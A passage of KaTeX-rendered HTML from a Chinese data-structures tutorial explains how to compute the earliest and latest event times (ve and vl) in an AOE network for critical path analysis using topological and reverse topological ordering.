class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal">a</span><span class="mord mathnormal">x</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal">e</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.09618em;">J</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mord mathnormal">e</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">h</span><span class="mord mathnormal">t</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span>，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>v</mi><mi>k</mi></msub></mrow><annotation encoding="application/x-tex">v_{k}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>v</mi><mi>j</mi></msub></mrow><annotation encoding="application/x-tex">v_{j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span> 的任意后继，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>W</mi><mi>e</mi><mi>i</mi><mi>g</mi><mi>h</mi><mi>t</mi><mo stretchy="false">(</mo><msub><mi>v</mi><mi>j</mi></msub><mo separator="true">,</mo><msub><mi>v</mi><mi>k</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">Weight(v_{j}, v_{k})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mord mathnormal">e</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">h</span><span class="mord mathnormal">t</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span> 表示 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>&lt;</mo><msub><mi>v</mi><mi>j</mi></msub><mo separator="true">,</mo><msub><mi>v</mi><mi>k</mi></msub><mo>&gt;</mo></mrow><annotation encoding="application/x-tex">&lt;v_{j}, v_{k}&gt;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8252em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span></span></span></span> 上的权值</p>
<p>计算 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi><mi>e</mi><mo stretchy="false">(</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">ve()</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal">e</span><span class="mopen">(</span><span class="mclose">)</span></span></span></span> 值时，按从前往后的顺序进行，可以在拓扑排序的基础上计算：</p>
<ul>
<li>初始时，令 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi><mi>e</mi><mo stretchy="false">[</mo><mn>1</mn><mo>…</mo><mi>n</mi><mo stretchy="false">]</mo><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">ve[1 \dotsc n] = 0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal">e</span><span class="mopen">[</span><span class="mord">1</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span></li>
<li>输出一个入度为 <code>0</code> 的顶点年时，计算它所有直接后继顶点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>v</mi><mi>k</mi></msub></mrow><annotation encoding="application/x-tex">v_{k}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 的最早发生时间，若 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi><mi>e</mi><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo><mo>+</mo><mi>W</mi><mi>e</mi><mi>i</mi><mi>g</mi><mi>h</mi><mi>t</mi><mo stretchy="false">(</mo><msub><mi>v</mi><mi>j</mi></msub><mo separator="true">,</mo><msub><mi>v</mi><mi>k</mi></msub><mo stretchy="false">)</mo><mo>&gt;</mo><mi>v</mi><mi>e</mi><mo stretchy="false">[</mo><mi>k</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">ve[j] + Weight(v_{j}, v_{k}) &gt; ve[k]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal">e</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mord mathnormal">e</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">h</span><span class="mord mathnormal">t</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal">e</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">]</span></span></span></span>，则 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi><mi>e</mi><mo stretchy="false">[</mo><mi>k</mi><mo stretchy="false">]</mo><mo>=</mo><mi>v</mi><mi>e</mi><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo><mo>+</mo><mi>W</mi><mi>e</mi><mi>i</mi><mi>g</mi><mi>h</mi><mi>t</mi><mo stretchy="false">(</mo><msub><mi>v</mi><mi>j</mi></msub><mo separator="true">,</mo><msub><mi>v</mi><mi>k</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">ve[k] = ve[j] + Weight(v_{j}, v_{k})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal">e</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal">e</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mord mathnormal">e</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">h</span><span class="mord mathnormal">t</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>。以此类推，直至输出全部顶点</li>
</ul>
</li>
<li>
<p><strong>事件 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>v</mi><mi>k</mi></msub></mrow><annotation encoding="application/x-tex">v_{k}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 的最迟发生时间 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi><mi>l</mi><mo stretchy="false">(</mo><mi>K</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">vl(K)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mclose">)</span></span></span></span></strong></p>
<p>它是指在不推迟整个工程完成的前提下，即保证它的后继事件 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>v</mi><mi>j</mi></msub></mrow><annotation encoding="application/x-tex">v_{j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span> 在其最迟发生时间 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi><mi>l</mi><mo stretchy="false">(</mo><mi>j</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">vl(j)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">)</span></span></span></span> 能够发生时，该事件最迟必须发生的时间。可用下面的递推公式来计算：</p>
<p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi><mi>l</mi><mo stretchy="false">(</mo><mtext>汇点</mtext><mo stretchy="false">)</mo><mo>=</mo><mi>v</mi><mi>e</mi><mo stretchy="false">(</mo><mtext>汇点</mtext><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">vl(\text{汇点}) = ve(\text{汇点})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mopen">(</span><span class="mord text"><span class="mord cjk_fallback">汇点</span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal">e</span><span class="mopen">(</span><span class="mord text"><span class="mord cjk_fallback">汇点</span></span><span class="mclose">)</span></span></span></span></p>
<p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi><mi>l</mi><mo stretchy="false">(</mo><mi>k</mi><mo stretchy="false">)</mo><mo>=</mo><mi>M</mi><mi>i</mi><mi>n</mi><mrow><mi>v</mi><mi>l</mi><mo stretchy="false">(</mo><mi>j</mi><mo stretchy="false">)</mo><mo>−</mo><mi>W</mi><mi>e</mi><mi>i</mi><mi>g</mi><mi>h</mi><mi>t</mi><mo stretchy="false">(</mo><msub><mi>v</mi><mi>k</mi></msub><mo separator="true">,</mo><msub><mi>v</mi><mi>j</mi></msub><mo stretchy="false">)</mo></mrow></mrow><annotation encoding="application/x-tex">vl(k) = Min{vl(j) - Weight(v_{k}, v_{j})}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal">in</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mord mathnormal">e</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">h</span><span class="mord mathnormal">t</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span>，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>v</mi><mi>k</mi></msub></mrow><annotation encoding="application/x-tex">v_{k}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>v</mi><mi>j</mi></msub></mrow><annotation encoding="application/x-tex">v_{j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span> 的任意前驱</p>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>在计算 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi><mi>e</mi><mo stretchy="false">(</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">ve()</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal">e</span><span class="mopen">(</span><span class="mclose">)</span></span></span></span> 值时，按从后往前的顺序进行，可以在逆拓扑排序的基础上计算</p>
</div>
<p>计算 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi><mi>e</mi><mo stretchy="false">(</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">ve()</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal">e</span><span class="mopen">(</span><span class="mclose">)</span></span></span></span> 值时，按从后往前的顺序进行，在上述拓扑排序中，增设一个栈以记录拓扑序列，拓扑排序结束后从栈顶至栈底便为逆拓扑有序序列。过程如下：</p>
<ul>
<li>初始时，令 $ vl[1 \dotsc n] = ve[n]$</li>
<li>栈顶顶点与出栈，计算其所有直接前驱顶点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>v</mi><mi>k</mi></msub></mrow><annotation encoding="application/x-tex">v_{k}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 的最迟发生时间，若 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi><mi>l</mi><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo><mo>−</mo><mi>W</mi><mi>e</mi><mi>i</mi><mi>g</mi><mi>h</mi><mi>t</mi><mo stretchy="false">(</mo><msub><mi>v</mi><mi>k</mi></msub><mo separator="true">,</mo><msub><mi>v</mi><mi>j</mi></msub><mo stretchy="false">)</mo><mo>&lt;</mo><mi>v</mi><mi>l</mi><mo stretchy="false">[</mo><mi>k</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">vl[j] - Weight(v_{k}, v_{j}) &lt; vl[k]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mord mathnormal">e</span><span class="mord mathnormal">i</span><span class="mord mathnormal" 